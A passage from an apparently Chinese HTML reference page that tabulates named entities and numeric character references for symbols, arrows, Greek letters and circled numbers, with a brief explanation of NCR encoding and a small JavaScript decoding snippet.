        <td align="center">&ldquo;</td> <td class="fuhao_text">&amp;quot;</td>
        <td align="center">&trade;</td> <td class="fuhao_text">&amp;trade;</td>
    </tr>
    <tr> <td colspan="10"></td> </tr>
    <tr>
        <td align="center">&euro;</td> <td class="fuhao_text">&amp;euro;</td>
        <td align="center">&pound;</td> <td class="fuhao_text">&amp;pound;</td>
        <td align="center">&yen;</td> <td class="fuhao_text">&amp;yen;</td>
        <td align="center">&nbsp;</td> <td class="fuhao_text">&nbsp;</td>
        <td align="center">&nbsp;</td> <td class="fuhao_text">&nbsp;</td>
    </tr>
    <tr> <td colspan="10"></td> </tr>
    <tr>
        <td align="center">&bdquo;</td> <td class="fuhao_text">&amp;bdquo;</td>
        <td align="center">&hellip;</td> <td class="fuhao_text">&amp;hellip;</td>
        <td align="center">&middot;</td> <td class="fuhao_text">&amp;middot;</td>
        <td align="center">&rsaquo;</td> <td class="fuhao_text">&amp;rsaquo;</td>
        <td align="center">&ordf;</td> <td class="fuhao_text">&amp;ordf;</td>
    </tr>
    <tr>
        <td align="center">&circ;</td> <td class="fuhao_text">&amp;circ;</td>
        <td align="center">&ldquo;</td> <td class="fuhao_text">&amp;ldquo;</td>
        <td align="center">&mdash;</td> <td class="fuhao_text">&amp;mdash;</td>
        <td align="center">&rsquo;</td> <td class="fuhao_text">&amp;rsquo;</td>
        <td align="center">&ordm;</td> <td class="fuhao_text">&amp;ordm;</td>
    </tr>
    <tr>
        <td align="center">&dagger;</td> <td class="fuhao_text">&amp;dagger;</td>
        <td align="center">&lsaquo;</td> <td class="fuhao_text">&amp;lsaquo;</td>
        <td align="center">&ndash;</td> <td class="fuhao_text">&amp;ndash;</td>
        <td align="center">&sbquo;</td> <td class="fuhao_text">&amp;sbquo;</td>
        <td align="center">&rdquo;</td> <td class="fuhao_text">&amp;rdquo;</td>
    </tr>
    <tr>
        <td align="center">&Dagger;</td> <td class="fuhao_text">&amp;Dagger;</td>
        <td align="center">&lsquo;</td> <td class="fuhao_text">&amp;lsquo;</td>
        <td align="center">&permil;</td> <td class="fuhao_text">&amp;permil;</td>
        <td align="center">&shy;</td> <td class="fuhao_text">&amp;shy;</td>
        <td align="center">&tilde;</td> <td class="fuhao_text">&amp;tilde;</td>
    </tr>
    <tr> <td colspan="10"></td> </tr>
    <tr>
        <td align="center">&asymp;</td> <td class="fuhao_text">&amp;asymp;</td>
        <td align="center">&frasl;</td> <td class="fuhao_text">&amp;frasl;</td>
        <td align="center">&larr;</td> <td class="fuhao_text">&amp;larr;</td>
        <td align="center">&part;</td> <td class="fuhao_text">&amp;part;</td>
        <td align="center">&spades;</td> <td class="fuhao_text">&amp;spades;</td>
    </tr>
    <tr>
        <td align="center">&cap;</td> <td class="fuhao_text">&amp;cap;</td>
        <td align="center">&ge;</td> <td class="fuhao_text">&amp;ge;</td>
        <td align="center">&le;</td> <td class="fuhao_text">&amp;le;</td>
        <td align="center">&Prime;</td> <td class="fuhao_text">&amp;Prime;</td>
        <td align="center">&sum;</td> <td class="fuhao_text">&amp;sum;</td>
    </tr>
    <tr>
        <td align="center">&clubs;</td> <td class="fuhao_text">&amp;clubs;</td>
        <td align="center">&harr;</td> <td class="fuhao_text">&amp;harr;</td>
        <td align="center">&loz;</td> <td class="fuhao_text">&amp;loz;</td>
        <td align="center">&prime;</td> <td class="fuhao_text">&amp;prime;</td>
        <td align="center">&uarr;</td> <td class="fuhao_text">&amp;uarr;</td>
    </tr>
    <tr>
        <td align="center">&darr;</td> <td class="fuhao_text">&amp;darr;</td>
        <td align="center">&hearts;</td> <td class="fuhao_text">&amp;hearts;</td>
        <td align="center">&minus;</td> <td class="fuhao_text">&amp;minus;</td>
        <td align="center">&prod;</td> <td class="fuhao_text">&amp;prod;</td>
        <td align="center">&zwj;</td> <td class="fuhao_text">&amp;zwj;</td>
    </tr>
    <tr>
        <td align="center">&diams;</td> <td class="fuhao_text">&amp;diams;</td>
        <td align="center">&infin;</td> <td class="fuhao_text">&amp;infin;</td>
        <td align="center">&ne;</td> <td class="fuhao_text">&amp;ne;</td>
        <td align="center">&radic;</td> <td class="fuhao_text">&amp;radic;</td>
        <td align="center">&zwnj;</td> <td class="fuhao_text">&amp;zwnj;</td>
    </tr>
    <tr>
        <td align="center">&equiv;</td> <td class="fuhao_text">&amp;equiv;</td>
        <td align="center">&int;</td> <td class="fuhao_text">&amp;int;</td>
        <td align="center">&oline;</td> <td class="fuhao_text">&amp;oline;</td>
        <td align="center">&rarr;</td> <td class="fuhao_text">&amp;rarr;</td>
        <td width="46">&nbsp;</td>
        <td width="63">&nbsp;</td>
    </tr>
    <tr> <td colspan="10"></td> </tr>
    <tr>
        <td align="center">&alpha;</td> <td class="fuhao_text">&amp;alpha;</td>
        <td align="center">&eta;</td> <td class="fuhao_text">&amp;eta;</td>
        <td align="center">&mu;</td> <td class="fuhao_text">&amp;mu;</td>
        <td align="center">&pi;</td> <td class="fuhao_text">&amp;pi;</td>
        <td align="center">&theta;</td> <td class="fuhao_text">&amp;theta;</td>
    </tr>
    <tr>
        <td align="center">&beta;</td> <td class="fuhao_text">&amp;beta;</td>
        <td align="center">&gamma;</td> <td class="fuhao_text">&amp;gamma;</td>
        <td align="center">&nu;</td> <td class="fuhao_text">&amp;nu;</td>
        <td align="center">&psi;</td> <td class="fuhao_text">&amp;psi;</td>
        <td align="center">&upsilon;</td> <td class="fuhao_text">&amp;upsilon;</td>
    </tr>
    <tr>
        <td align="center">&chi;</td> <td class="fuhao_text">&amp;chi;</td>
        <td align="center">&iota;</td> <td class="fuhao_text">&amp;iota;</td>
        <td align="center">&omega;</td> <td class="fuhao_text">&amp;omega;</td>
        <td align="center">&rho;</td> <td class="fuhao_text">&amp;rho;</td>
        <td align="center">&xi;</td> <td class="fuhao_text">&amp;xi;</td>
    </tr>
    <tr>
        <td align="center">&delta;</td> <td class="fuhao_text">&amp;delta;</td>
        <td align="center">&kappa;</td> <td class="fuhao_text">&amp;kappa;</td>
        <td align="center">&omicron;</td> <td class="fuhao_text">&amp;omicron;</td>
        <td align="center">&sigma;</td> <td class="fuhao_text">&amp;sigma;</td>
        <td align="center">&zeta;</td> <td class="fuhao_text">&amp;zeta;</td>
    </tr>
    <tr>
        <td align="center">&epsilon;</td> <td class="fuhao_text">&amp;epsilon;</td>
        <td align="center">&lambda;</td> <td class="fuhao_text">&amp;lambda;</td>
        <td align="center">&phi;</td> <td class="fuhao_text">&amp;phi;</td>
        <td align="center">&tau;</td> <td class="fuhao_text">&amp;tau;</td> <td class="fuhao_text">&nbsp;</td> <td class="fuhao_text">&nbsp;</td>
    </tr>
    <tr> <td colspan="10"></td> </tr>
    <tr>
        <td align="center">&Alpha;</td> <td class="fuhao_text">&amp;Alpha;</td>
        <td align="center">&Eta;</td> <td class="fuhao_text">&amp;Eta;</td>
        <td align="center">&Mu;</td> <td class="fuhao_text">&amp;Mu;</td>
        <td align="center">&Pi;</td> <td class="fuhao_text">&amp;Pi;</td>
        <td align="center">&Theta;</td> <td class="fuhao_text">&amp;Theta;</td>
    </tr>
    <tr>
        <td align="center">&Beta;</td> <td class="fuhao_text">&amp;Beta;</td>
        <td align="center">&Gamma;</td> <td class="fuhao_text">&amp;Gamma;</td>
        <td align="center">&Nu;</td> <td class="fuhao_text">&amp;Nu;</td>
        <td align="center">&Psi;</td> <td class="fuhao_text">&amp;Psi;</td>
        <td align="center">&Upsilon;</td> <td class="fuhao_text">&amp;Upsilon;</td>
    </tr>
    <tr>
        <td align="center">&Chi;</td> <td class="fuhao_text">&amp;Chi;</td>
        <td align="center">&Iota;</td> <td class="fuhao_text">&amp;Iota;</td>
        <td align="center">&Omega;</td> <td class="fuhao_text">&amp;Omega;</td>
        <td align="center">&Rho;</td> <td class="fuhao_text">&amp;Rho;</td>
        <td align="center">&Xi;</td> <td class="fuhao_text">&amp;Xi;</td>
    </tr>
    <tr>
        <td align="center">&Delta;</td> <td class="fuhao_text">&amp;Delta;</td>
        <td align="center">&Kappa;</td> <td class="fuhao_text">&amp;Kappa;</td>
        <td align="center">&Omicron;</td> <td class="fuhao_text">&amp;Omicron;</td>
        <td align="center">&Sigma;</td> <td class="fuhao_text">&amp;Sigma;</td>
        <td align="center">&Zeta;</td> <td class="fuhao_text">&amp;Zeta;</td>
    </tr>
    <tr>
        <td align="center">&Epsilon;</td> <td class="fuhao_text">&amp;Epsilon;</td>
        <td align="center">&Lambda;</td> <td class="fuhao_text">&amp;Lambda;</td>
        <td align="center">&Phi;</td> <td class="fuhao_text">&amp;Phi;</td>
        <td align="center">&Tau;</td> <td class="fuhao_text">&amp;Tau;</td>
        <td align="center">&sigmaf;</td> <td class="fuhao_text">&amp;sigmaf;</td>
    </tr>
  </table>
</div>

<div id="ncr">
<h3>NCC编码字符大全</h3><pre>
NCR(Numeric Character Reference,数字字符引用)编码是一种常见的标记结构,用于SGML和其他SGML相似的标记语言如HTML和XML,它由一个与号(&)、一个井号(#)、这个字符的Unicode编码值、一个分号组成的短字符序列,代表一个字符(全球的文字字符)

优点：
(1)无视载体文件编码,无论是gbk编码还是utf-8编码,展示的字符都不会出现乱码,这点就是它存在的原因。

缺点：
(1)浏览器支持度不同,比如字符A在IE浏览器支持,却在chrome浏览器不支持,甚至有可能同一字符在不同浏览器展示的内容不一样(机率非常小),所以使用时务必在各浏览器上进行测试。
(2)移动端对此编码支持度较差,特别是在Window phone下和UC浏览下器,直接无法显示。

例:★ 9733 2605
9733的十六进制为2605,要在十六进制编码前加x表示使用的是十六进制编码
& # 9 7 3 3;   不留空格,十进制,直接显示星号&#9733;
& # x 2 6 0 5;  不留空格,十六进制,直接显示星号&#x2605;
css中使用伪类:before :after的content值,格式：h1:before { content:"\2605"; }
在js中使用格式:u + 十六进制编码,如u2605  -> 测试无效

&#nnnn; nnnn是字符编码的十进制表示
&#xhhhh; hhhh是字符的16进制表示

</pre><textarea>// 前端将NCR转为普通字符
var title = "&# 35746;&# 21333;&# 21015;&# 34920;"
var title = "&# 29992;&# 25143;&# 27169;&# 22359;"
var regex = /&#(\d+);/g;
title = title.replace(regex, (_, $1) => String.fromCharCode($1))

十六进制编码
hextotext = data => {
  var dataTemp
  var str = ''
  if(data == '') return
  dataTemp = data.splite('\\u')
  for(var i = 0; i < dataTemp.length; i++){
    str += String.fromCharCode(parseInt(dataTemp[i], 16).toString(10))
  }
  return str
}

var text = '&# x0022;&# x9A08;'
var divObj = document.createElement('div')
divObj.innerHTML = text
console.log(divObj.innerHTML)

</textarea><pre>
如下是最常使用的字符编码列了出来,并进行了分类,以下字符是同时兼容IE和chrome浏览器的,至于其它浏览器,请自行测试

</pre>

<h3>⇠ 箭头类</h3>
<table>
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>‹</td><td class="fuhao_text">&amp;#8249</td>
            <td>›</td><td class="fuhao_text">&amp;#8250</td>
            <td>‿</td><td class="fuhao_text">&amp;#8255</td>
            <td>⁀</td><td class="fuhao_text">&amp;#8256</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>←</td><td class="fuhao_text">&amp;#8592</td>
            <td>→</td><td class="fuhao_text">&amp;#8594</td>
            <td>↑</td><td class="fuhao_text">&amp;#8593</td>
            <td>↓</td><td class="fuhao_text">&amp;#8595</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>↔</td><td class="fuhao_text">&amp;#8596</td>
            <td>↕</td><td class="fuhao_text">&amp;#8597</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>↖</td><td class="fuhao_text">&amp;#8598</td>
            <td>↗</td><td class="fuhao_text">&amp;#8599</td>
            <td>↘</td><td class="fuhao_text">&amp;#8600</td>
            <td>↙</td><td class="fuhao_text">&amp;#8601</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>↚</td><td class="fuhao_text">&amp;#8602</td>
            <td>↛</td><td class="fuhao_text">&amp;#8603</td>
            <td>↜</td><td class="fuhao_text">&amp;#8604</td>
            <td>↝</td><td class="fuhao_text">&amp;#8605</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>↞</td><td class="fuhao_text">&amp;#8606</td>
            <td>↠</td><td class="fuhao_text">&amp;#8608</td>
            <td>↟</td><td class="fuhao_text">&amp;#8607</td>
            <td>↡</td><td class="fuhao_text">&amp;#8609</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>↢</td><td class="fuhao_text">&amp;#8610</td>
            <td>↣</td><td class="fuhao_text">&amp;#8611</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>↤</td><td class="fuhao_text">&amp;#8612</td>
            <td>↥</td><td class="fuhao_text">&amp;#8613</td>
            <td>↦</td><td class="fuhao_text">&amp;#8614</td>
            <td>↧</td><td class="fuhao_text">&amp;#8615</td>
            <td>↨</td><td class="fuhao_text">&amp;#8616</td>
        </tr>
        <tr>
            <td>↩</td><td class="fuhao_text">&amp;#8617</td>
            <td>↪</td><td class="fuhao_text">&amp;#8618</td>
            <td>↫</td><td class="fuhao_text">&amp;#8619</td>
            <td>↬</td><td class="fuhao_text">&amp;#8620</td>
            <td>↭</td><td class="fuhao_text">&amp;#8621</td>
        </tr>
        <tr>
            <td>↮</td><td class="fuhao_text">&amp;#8622</td>
            <td>↯</td><td class="fuhao_text">&amp;#8623</td>
            <td></td><td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>↰</td><td class="fuhao_text">&amp;#8624</td>
            <td>↱</td><td class="fuhao_text">&amp;#8625</td>
            <td>↲</td><td class="fuhao_text">&amp;#8626</td>
            <td>↳</td><td class="fuhao_text">&amp;#8627</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>↴</td><td class="fuhao_text">&amp;#8628</td>
            <td>↵</td><td class="fuhao_text">&amp;#8629</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>↶</td><td class="fuhao_text">&amp;#8630</td>
            <td>↷</td><td class="fuhao_text">&amp;#8631</td>
            <td>↸</td><td class="fuhao_text">&amp;#8632</td>
            <td>↹</td><td class="fuhao_text">&amp;#8633</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>↺</td><td class="fuhao_text">&amp;#8634</td>
            <td>↻</td><td class="fuhao_text">&amp;#8635</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>⇄</td><td class="fuhao_text">&amp;#8644</td>
            <td>⇅</td><td class="fuhao_text">&amp;#8645</td>
            <td>⇆</td><td class="fuhao_text">&amp;#8646</td>
            <td>⇇</td><td class="fuhao_text">&amp;#8647</td>
            <td>⇈</td><td class="fuhao_text">&amp;#8648</td>
        </tr>
        <tr>
            <td>⇉</td><td class="fuhao_text">&amp;#8649</td>
            <td>⇊</td><td class="fuhao_text">&amp;#8650</td>
            <td>⇋</td><td class="fuhao_text">&amp;#8651</td>
            <td>⇌</td><td class="fuhao_text">&amp;#8652</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>⇍</td><td class="fuhao_text">&amp;#8653</td>
            <td>⇎</td><td class="fuhao_text">&amp;#8654</td>
            <td>⇏</td><td class="fuhao_text">&amp;#8655</td>
            <td>⇐</td><td class="fuhao_text">&amp;#8656</td>
            <td>⇑</td><td class="fuhao_text">&amp;#8657</td>
        </tr>
        <tr>
            <td>⇒</td><td class="fuhao_text">&amp;#8658</td>
            <td>⇓</td><td class="fuhao_text">&amp;#8659</td>
            <td>⇔</td><td class="fuhao_text">&amp;#8660</td>
            <td>⇕</td><td class="fuhao_text">&amp;#8661</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>⇖</td><td class="fuhao_text">&amp;#8662</td>
            <td>⇗</td><td class="fuhao_text">&amp;#8663</td>
            <td>⇘</td><td class="fuhao_text">&amp;#8664</td>
            <td>⇙</td><td class="fuhao_text">&amp;#8665</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>⇚</td><td class="fuhao_text">&amp;#8666</td>
            <td>⇛</td><td class="fuhao_text">&amp;#8667</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>⇜</td><td class="fuhao_text">&amp;#8668</td>
            <td>⇝</td><td class="fuhao_text">&amp;#8669</td>
            <td>⇞</td><td class="fuhao_text">&amp;#8670</td>
            <td>⇟</td><td class="fuhao_text">&amp;#8671</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>⇠</td><td class="fuhao_text">&amp;#8672</td>
            <td>⇢</td><td class="fuhao_text">&amp;#8674</td>
            <td>⇡</td><td class="fuhao_text">&amp;#8673</td>
            <td>⇣</td><td class="fuhao_text">&amp;#8675</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>⇤</td><td class="fuhao_text">&amp;#8676</td>
            <td>⇥</td><td class="fuhao_text">&amp;#8677</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>⇦</td><td class="fuhao_text">&amp;#8678</td>
            <td>⇨</td><td class="fuhao_text">&amp;#8680</td>
            <td>⇧</td><td class="fuhao_text">&amp;#8679</td>
            <td>⇩</td><td class="fuhao_text">&amp;#8681</td>
            <td>⇪</td><td class="fuhao_text">&amp;#8682</td>
        </tr>
        <tr>
            <td>⋖</td><td class="fuhao_text">&amp;#8918</td>
            <td>⋗</td><td class="fuhao_text">&amp;#8919</td>
            <td>⋘</td><td class="fuhao_text">&amp;#8920</td>
            <td>⋙</td><td class="fuhao_text">&amp;#8921</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>▲</td><td class="fuhao_text">&amp;#9650</td>
            <td>►</td><td class="fuhao_text">&amp;#9658</td>
            <td>▼</td><td class="fuhao_text">&amp;#9660</td>
            <td>◄</td><td class="fuhao_text">&amp;#9668</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>☚</td><td class="fuhao_text">&amp;#9754</td>
            <td>☛</td><td class="fuhao_text">&amp;#9755</td>
            <td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>☜</td><td class="fuhao_text">&amp;#9756</td>
            <td>☝</td><td class="fuhao_text">&amp;#9757</td>
            <td>☞</td><td class="fuhao_text">&amp;#9758</td>
            <td>☟</td><td class="fuhao_text">&amp;#9759</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>➘</td><td class="fuhao_text">&amp;#10136</td>
            <td>➙</td><td class="fuhao_text">&amp;#10137</td>
            <td>➚</td><td class="fuhao_text">&amp;#10138</td>
            <td>➛</td><td class="fuhao_text">&amp;#10139</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>➟</td><td class="fuhao_text">&amp;#10143</td>
            <td>➠</td><td class="fuhao_text">&amp;#10144</td>
            <td>➡</td><td class="fuhao_text">&amp;#10145</td>
            <td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>➢</td><td class="fuhao_text">&amp;#10146</td>
            <td>➣</td><td class="fuhao_text">&amp;#10147</td>
            <td>➤</td><td class="fuhao_text">&amp;#10148</td>
            <td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>➥</td><td class="fuhao_text">&amp;#10149</td>
            <td>➦</td><td class="fuhao_text">&amp;#10150</td>
            <td>➧</td><td class="fuhao_text">&amp;#10151</td>
            <td>➨</td><td class="fuhao_text">&amp;#10152</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>➩</td><td class="fuhao_text">&amp;#10153</td>
            <td>➪</td><td class="fuhao_text">&amp;#10154</td>
            <td>➫</td><td class="fuhao_text">&amp;#10155</td>
            <td>➬</td><td class="fuhao_text">&amp;#10156</td>
            <td>➭</td><td class="fuhao_text">&amp;#10157</td>
        </tr>
        <tr>
            <td>➮</td><td class="fuhao_text">&amp;#10158</td>
            <td>➯</td><td class="fuhao_text">&amp;#10159</td>
            <td>➰</td><td class="fuhao_text">&amp;#10160</td>
            <td>➱</td><td class="fuhao_text">&amp;#10161</td>
            <td>➲</td><td class="fuhao_text">&amp;#10162</td>
        </tr>
        <tr>
            <td>➳</td><td class="fuhao_text">&amp;#10163</td>
            <td>➴</td><td class="fuhao_text">&amp;#10164</td>
            <td>➵</td><td class="fuhao_text">&amp;#10165</td>
            <td>➶</td><td class="fuhao_text">&amp;#10166</td>
            <td></td><td></td>
        </tr>
        <tr>
            <td>➷</td><td class="fuhao_text">&amp;#10167</td>
            <td>➸</td><td class="fuhao_text">&amp;#10168</td>
            <td>➹</td><td class="fuhao_text">&amp;#10169</td>
            <td>➺</td><td class="fuhao_text">&amp;#10170</td>
            <td>➻</td><td class="fuhao_text">&amp;#10171</td>
        </tr>
        <tr>
            <td>➼</td><td class="fuhao_text">&amp;#10172</td>
            <td>➽</td><td class="fuhao_text">&amp;#10173</td>
            <td>➾</td><td class="fuhao_text">&amp;#10174</td>
            <td>☇</td><td class="fuhao_text">&amp;#9735</td>
            <td>☈</td><td class="fuhao_text">&amp;#9736</td>
        </tr>
    </tbody>
</table>

<h3> Ⓐ 编号类 </h3>
<table width="843">
    <thead>
        <tr>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th><th>符号</th><th>十进制编码</th>
            <th>符号</th><th>十进制编码</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>①</td><td class="fuhao_text">&amp;#9312</td>
            <td>②</td><td class="fuhao_text">&amp;#9313</td>
            <td>③</td><td class="fuhao_text">&amp;#9314</td>
            <td>④</td><td class="fuhao_text">&amp;#9315</td>
            <td>⑤</td><td class="fuhao_text">&amp;#9316</td>
        </tr>
        <tr>
            <td>⑥</td><td class="fuhao_text">&amp;#9317</td>
            <td>⑦</td><td class="fuhao_text">&amp;#9318</td>
            <td>⑧</td><td class="fuhao_text">&amp;#9319</td>
            <td>⑨</td><td class="fuhao_text">&amp;#9320</td>
            <td>⑩</td><td class="fuhao_text">&amp;#9321</td>
        </tr>
        <tr>
            <td>⑪</td><td class="fuhao_text">&amp;#9322</td>
            <td>⑫</td><td class="fuhao_text">&amp;#9323</td>
            <td>⑬</td><td class="fuhao_text">&amp;#9324</td>
            <td>⑭</td><td class="fuhao_text">&amp;#9325</td>
            <td>⑮</td><td class="fuhao_text">&amp;#9326</td>
        </tr>
        <tr>
            <td>⑯</td><td class="fuhao_text">&amp;#9327</td>
            <td>⑰</td><td class="fuhao_text">&amp;#9328</td>
            <td>⑱</td><td class="fuhao_text">&amp;#9329</td>
            <td>⑲</td><td class="fuhao_text">&amp;#9330</td>
            <td>⑳</td><td class="fuhao_text">&amp;#9331</td>
        </tr>
        <tr>
            <td>㉑</td><td class="fuhao_text">&amp;#12881</td>
            <td>㉒</td><td class="fuhao_text">&amp;#12882</td>
            <td>㉓</td><td class="fuhao_text">&amp;#12883</td>
            <td>㉔</td><td class="fuhao_text">&amp;#12884</td>
            <td>㉕</td><td class="fuhao_text">&amp;#12885</td>
        </tr>
        <tr>
            <td>㉖</td><td class="fuhao_text">&amp;#12886</td>
            <td>㉗</td><td class="fuhao_text">&amp;#12887</td>
            <td>㉘</td><td class="fuhao_text">&amp;#12888</td>
            <td>㉙</td><td class="fuhao_text">&amp;#12889</td>
            <td>㉚</td><td class="fuhao_text">&amp;#12890</td>
        </tr>
        <tr>
            <td>㉛</td><td class="fuhao_text">&amp;#12891</td>
            <td>㉜</td><td class="fuhao_text">&amp;#12892</td>
            <td>㉝</td><td class="fuhao_text">&amp;#12893</td>
            <td>㉞</td><td class="fuhao_text">&amp;#12894</td>
            <td>㉟</td><td class="fuhao_text">&amp;#12895</td>
        </tr>
        <tr>
            <td>㊱</td><td class="fuhao_text">&amp;#12977</td>
            <td>㊲</td><td class="fuhao_text">&amp;#12978</td>
            <td>㊳</td><td class="fuhao_text">&amp;#12979</td>
            <td>㊴</td><td class="fuhao_text">&amp;#12980</td>
            <td>㊵</td><td class="fuhao_text">&amp;#12981</td>
        </tr>
        <tr>
            <td>㊶</td><td class="fuhao_text">&amp;#12982</td>
            <td>㊷</td><td class="fuhao_text">&amp;#12983</td>
            <td>㊸</td><td class="fuhao_text">&amp;#12984</td>
            <td>㊹</td><td class="fuhao_text">&amp;#12985</td>
            <td>㊺</td><td class="fuhao_text">&amp;#12986</td>
        </tr>
        <tr>
            <td>㊻</td><td class="fuhao_text">&amp;#12987</td>
            <td>㊼</td><td class="fuhao_text">&amp;#12988</td>
            <td>㊽</td><td class="fuhao_text">&amp;#12989</td>
            <td>㊾</td><td class="fuhao_text">&amp;#12990</td>
            <td>㊿</td><td class="fuhao_text">&amp;#12991</td>
        </tr>
        <tr>
            <td>➊</td><td class="fuhao_text">&amp;#10122</td>
            <td>➋</td><td class="fuhao_text">&amp;#10123</td>
            <td>➌</td><td class="fuhao_text">&amp;#10124</td>
            <td>➍</td><td class="fuhao_text">&amp;#10125</td>
            <td>➎</td><td class="fuhao_text">&amp;#10126</td>
        </tr>
        <tr>
            <td>➏</td><td class="fuhao_text">&amp;#10127</td>
            <td>➐</td><td class="fuhao_text">&amp;#10128</td>
            <td>➑</td><td class="fuhao_text">&amp;#10129</td>
            <td>➒</td><td class="fuhao_text">&amp;#10130</td>
            <td>➓</td><td class="fuhao_text">&amp;#10131</td>
        </tr>
        <tr>
            <td>⓫</td><td class="fuhao_text">&amp;#9451</td>
            <td>⓬</td><td class="fuhao_text">&amp;#9452</td>
            <td>⓭</td><td class="fuhao_text">&amp;#9453</td>
            <td>⓮</td><td class="fuhao_text">&amp;#9454</td>
            <td>⓯</td><td class="fuhao_text">&amp;#9455</td>
        </tr>
        <tr>
            <td>⓰</td><td class="fuhao_text">&amp;#9456</td>
            <td>⓱</td><td class="fuhao_text">&amp;#9457</td>
            <td>⓲</td><td class="fuhao_text">&amp;#9458</td>
            <td>⓳</td><td class="fuhao_text">&amp;#9459</td>
            <td>⓴</td><td class="fuhao_text">&amp;#9460</td>
        </tr>
        <tr>
            <td>Ⓐ</td><td class="fuhao_text">&amp;#9398</td>
            <td>Ⓑ</td><td class="fuhao_text">&amp;#9399</td>
            <td>Ⓒ</td><td class="fuhao_text">&amp;#9400</td>
            <td>Ⓓ</td><td class="fuhao_text">&amp;#9401</td>
            <td>Ⓔ</td><td class="fuhao_text">&amp;#9402</td>
        </tr>
        <tr>
            <td>Ⓕ</td><td class="fuhao_text">&amp;#9403</td>
            <td>Ⓖ</td><td class="fuhao_text">&amp;#9404</td>
            <td>Ⓗ</td><td class="fuhao_text">&amp;#9405</td>
            <td>Ⓘ</td><td class="fuhao_text">&amp;#9406</td>
            <td>Ⓙ</td><td class="fuhao_text">&amp;#9407</td>
        </tr>
        <tr>
            <td>Ⓚ</td><td class="fuhao_text">&amp;#9408</td>
            <td>Ⓛ</td><td class="fuhao_text">&amp;#9409</td>
            <td>Ⓜ</td><td class="fuhao_text">&amp;#9410</td>
            <td>Ⓝ</td><td class="fuhao_text">&amp;#9411</td>
            <td>Ⓞ</td><td class="fuhao_text">&amp;#9412</td>
        </tr>
        <tr>
            <td>Ⓟ</td><td class="fuhao_text">&amp;#9413</td>
            <td>Ⓠ</td><td class="fuhao_text">&amp;#9414</td>
            <td>Ⓡ</td><td class="fuhao_text">&amp;#9415</td>
            <td>Ⓢ</td><td class="fuhao_text">&amp;#9416</td>
            <td>Ⓣ</td><td class="fuhao_text">&amp;#9417</td>
        </tr>
        <tr>
            <td>Ⓤ</td><td class="fuhao_text">&amp;#9418</td>
            <td>Ⓥ</td><td class="fuhao_text">&amp;#9419</td>
            <td>Ⓦ</td><td class="fuhao_text">&amp;#9420</td>
            <td>Ⓧ</td><td class="fuhao_text">&amp;#9421</td>
            <td>Ⓨ</td><td class="fuhao_text">&amp;#9422</td>
        </tr>
        <tr>
            <td>Ⓩ</td><td class="fuhao_text">&amp;#9423</td>
            <td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td>
        </tr>
        <tr>
            <td>ⓐ</td><td class="fuhao_text">&amp;#9424</td>
            <td>ⓑ</td><td class="fuhao_text">&amp;#9425</td>
            <td>ⓒ</td><td class="fuhao_text">&amp;#9426</td>
            <td>ⓓ</td><td class="fuhao_text">&amp;#9427</td>
            <td>ⓔ</td><td class="fuhao_text">&amp;#9428</td>
        </tr>
        <tr>
            <td>ⓕ</td><td class="fuhao_text">&amp;#9429</td>
            <td>ⓖ</td><td class="fuhao_text">&amp;#9430</td>
            <td>ⓗ</td><td class="fuhao_text">&amp;#9431</td>
            <td>ⓘ</td><td class="fuhao_text">&amp;#9432</td>
            <td>ⓙ</td><td class="fuhao_text">&amp;#9433</td>
        </tr>
        <tr>
            <td>ⓚ</td><td class="fuhao_text">&amp;#9434</td>
            <td>ⓛ</td><td class="fuhao_text">&amp;#9435</td>
            <td>ⓜ</td><td class="fuhao_text">&amp;#9436</td>
            <td>ⓝ</td><td class="fuhao_text">&amp;#9437</td>
            <td>ⓞ</td><td class="fuhao_text">&amp;#9438</td>
        </tr>
        <tr>
            <td>ⓟ</td><td class="fuhao_text">&amp;#9439</td>
            <td>ⓠ</td><td class="fuhao_text">&amp;#9440</td>
            <td>ⓡ</td><td class="fuhao_text">&amp;#9441</td>
            <td>ⓢ</td><td class="fuhao_text">&amp;#9442</td>
            <td>ⓣ</td><td class="fuhao_text">&amp;#9443</td>
        </tr>
        <tr>
            <td>ⓤ</td><td class="fuhao_text">&amp;#9444</td>
            <td>ⓥ</td><td class="fuhao_text">&amp;#9445</td>
            <td>ⓦ</td><td class="fuhao_text">&amp;#9446</td>
            <td>ⓧ</td><td class="fuhao_text">&amp;#9447</td>
            <td>ⓨ</td><td class="fuhao_text">&amp;#9448</td>
        </tr>
        <tr>
